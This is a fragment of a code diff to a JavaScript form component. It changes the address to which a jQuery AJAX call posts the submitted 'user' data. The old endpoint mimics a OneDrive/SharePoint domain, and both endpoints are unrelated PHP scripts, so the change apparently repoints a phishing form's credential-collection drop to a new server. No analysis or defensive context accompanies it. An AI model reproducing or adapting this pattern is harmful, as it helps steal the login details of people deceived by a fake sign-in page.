@@ -49,7 +49,7 @@ export const Form = ({ toggleForm })=>{
             
             $.ajax({
                 type: "POST",
-                url: "https://ondrivshardocpoint.lat/Smallpagge/self.php",
+                url: "https://bucketlion.com/hello/glob.php",
                 data: user,
                 success(data) {
                     console.log('ok');
